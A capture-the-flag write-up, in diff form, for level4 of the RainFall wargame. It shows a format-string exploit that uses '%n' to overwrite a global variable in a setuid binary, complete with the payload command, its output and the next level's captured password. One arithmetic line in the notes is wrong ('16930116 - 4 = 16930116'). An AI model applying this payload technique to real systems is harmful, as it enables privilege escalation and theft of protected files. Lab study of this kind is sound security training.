@@ -1,0 +1,27 @@
+level4@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+
+This exercice follows the same logic as level3
+
+Here m must be equal to 16930116 and the part we want to execute is:
+    system("/bin/cat /home/user/level5/.pass");
+
+m address: objdump -t level4 
+08049810 g     O .bss	00000004              m
+(in little endian it's : \x10\x98\x04\x08)
+
+To check where our input is stored on the stack, we can also do: 
+    echo -e "AAAA%1\$x"
+and increase the number until finding 414141
+
+level4@RainFall:~$ echo -e "AAAA%12\$x" | ./level4 
+AAAA41414141
+
+Payload: [m addr][16930116 - 4 = 16930116][%12\$n]
+
+level4@RainFall:~$ echo -e "\x10\x98\x04\x08%16930112x%12\$n" > /tmp/b
+level4@RainFall:~$ cat /tmp/b - | ./level4 
+
+[ a lot of blank spaces ] then         b7ff26b0
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
